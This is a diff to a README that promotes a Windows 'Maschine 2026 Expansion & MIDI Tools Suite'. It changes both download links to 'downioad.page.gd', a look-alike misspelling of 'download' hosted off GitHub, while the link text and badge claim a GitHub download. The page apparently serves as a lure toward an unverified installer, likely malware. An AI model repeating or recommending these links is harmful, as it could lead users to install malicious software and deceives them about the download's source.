@@ -2,7 +2,7 @@
 
 The Maschine (Native Instruments) 2026 Expansion & MIDI Tools Suite is a comprehensive desktop application crafted for Windows 10 and Windows 11 users who seek to elevate their music production workflow with Maschine. This tool provides a unified interface for managing expansion packs, drum kits, and MIDI integrations, ensuring that your creative process is smooth and efficient. With support for the latest Maschine software and Windows updates, it is an essential companion for any Maschine enthusiast in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -69,7 +69,7 @@ A: Currently, the tool is optimized for x86 and x64 architectures. Support for W
 
 For the latest version and additional resources, please visit the download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
